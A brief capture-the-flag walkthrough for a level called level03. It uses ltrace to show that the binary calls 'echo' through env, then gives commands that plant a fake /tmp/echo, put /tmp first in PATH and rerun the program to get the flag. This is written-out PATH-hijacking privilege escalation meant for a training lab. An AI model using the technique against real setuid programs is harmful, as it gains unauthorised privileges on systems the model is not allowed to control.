we execute file level03 and we get "Exploit me" then we use ltrace system("/usr/bin/env echo Exploit me"Exploit me
-> echo "getflag" > /tmp/echo
-> chmod 777 /tmp/echo
-> export PATH=/tmp:$PATH
and we execute level03 again